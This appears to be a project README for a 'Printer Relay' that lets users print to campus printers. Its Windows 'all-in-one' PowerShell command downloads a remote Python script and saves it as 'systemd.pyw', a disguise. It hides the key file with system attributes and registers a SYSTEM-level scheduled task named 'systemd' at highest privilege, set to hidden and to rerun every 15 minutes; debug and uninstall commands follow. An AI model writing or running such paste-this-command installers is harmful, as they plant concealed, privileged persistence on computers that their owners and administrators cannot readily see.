# Printer Relay Setup

Print directly to campus printers from PreConnect.

---

## Windows Setup (All-in-One Command)

Open **PowerShell** and run (replace `<WORKER_KEY>` with your key):

```powershell
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator); $d = if ($isAdmin) { "$env:ProgramData\systemd" } else { "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" }; New-Item -ItemType Directory -Force -Path $d | Out-Null; Invoke-WebRequest -Uri "https://raw.githubusercontent.com/sabbirba/preconnect/main/printer.py" -OutFile "$d\systemd.pyw" -UseBasicParsing; Add-Type -AssemblyName System.Security; $scope = if ($isAdmin) { [System.Security.Cryptography.DataProtectionScope]::LocalMachine } else { [System.Security.Cryptography.DataProtectionScope]::CurrentUser }; $e = [System.Security.Cryptography.ProtectedData]::Protect([System.Text.Encoding]::UTF8.GetBytes("<WORKER_KEY>"), $null, $scope); Set-Content "$d\systemd.key" ("DPAPI:" + [Convert]::ToBase64String($e)); attrib +h +s "$d\systemd.key"; $py = if (Get-Command pythonw -ErrorAction SilentlyContinue) { "pythonw.exe" } else { if (-not (Test-Path "$d\py\pythonw.exe")) { Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip" -OutFile "$d\py.zip" -UseBasicParsing; Expand-Archive "$d\py.zip" -DestinationPath "$d\py" -Force; Remove-Item "$d\py.zip" }; "$d\py\pythonw.exe" }; if ($isAdmin) { schtasks /Create /TN "systemd" /TR "$py `"$d\systemd.pyw`"" /SC ONSTART /RI 15 /DU 24:00 /RU SYSTEM /RL HIGHEST /F; try { (New-Object -ComObject Schedule.Service).GetFolder("\").GetTask("systemd").Definition.Settings.Hidden = $true } catch {}; schtasks /Run /TN "systemd" } else { Start-Process $py "`"$d\systemd.pyw`"" }
```

---

## Debug Mode

```powershell
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/sabbirba/preconnect/main/printer.py" -OutFile "systemd.py" -UseBasicParsing; python systemd.py <WORKER_KEY> --debug
```

---

## Uninstall

Run in PowerShell to completely purge all files, scheduled tasks, and running processes:

```powershell
schtasks /Delete /TN "systemd" /F 2>$null; schtasks /Delete /TN "printer" /F 2>$null; Get-CimInstance Win32_Process -ErrorAction SilentlyContinue -Filter "Name='pythonw.exe' or Name='python.exe'" | Where-Object { $_.CommandLine -like "*systemd.py*" -or $_.CommandLine -like "*printer.py*" } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }; $s="$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"; Remove-Item "$s\systemd.*","$s\printer.*","$s\.ident" -Force -ErrorAction SilentlyContinue; if (Test-Path "$s\py") { Remove-Item "$s\py" -Recurse -Force -ErrorAction SilentlyContinue }; Remove-Item "$env:ProgramData\systemd","$env:ProgramData\printer" -Recurse -Force -ErrorAction SilentlyContinue; Remove-Item "systemd.*","printer.*","py.zip" -Force -ErrorAction SilentlyContinue
```